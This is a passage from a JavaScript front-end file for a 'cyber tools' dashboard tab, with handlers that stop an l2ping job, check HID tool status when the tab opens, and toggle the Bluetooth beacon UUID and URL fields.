        }
    })
    .catch(e => appendToolOutput('l2pingOutput', `Error: ${e}`, 'error'));
}

function stopL2ping() {
    fetch('/api/cyber/utils/l2ping/stop', { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            document.getElementById('btnStopL2ping').disabled = true;
            appendToolOutput('l2pingOutput', `Stopped - ${data.packets_sent || 0} packets sent`, 'info');
        });
}

// Check HID tool status when cyber tools tab is opened
document.addEventListener('DOMContentLoaded', () => {
    // Add event listener for when cyber tab is shown
    const origShowToolsTab = showToolsTab;
    showToolsTab = function(tabName) {
        origShowToolsTab.call(this, tabName);
        if (tabName === 'cyber') {
            checkCyberToolsStatus();
        }
    };

    // Handle beacon type change
    const beaconType = document.getElementById('beaconType');
    if (beaconType) {
        beaconType.addEventListener('change', function() {
            const uuidRow = document.getElementById('beaconUuidRow');
            const urlRow = document.getElementById('beaconUrlRow');
            if (this.value === 'eddystone_url') {
                uuidRow.style.display = 'none';
                urlRow.style.display = 'block';
            } else {
                uuidRow.style.display = 'block';
                urlRow.style.display = 'none';
            }
        });
    }
});
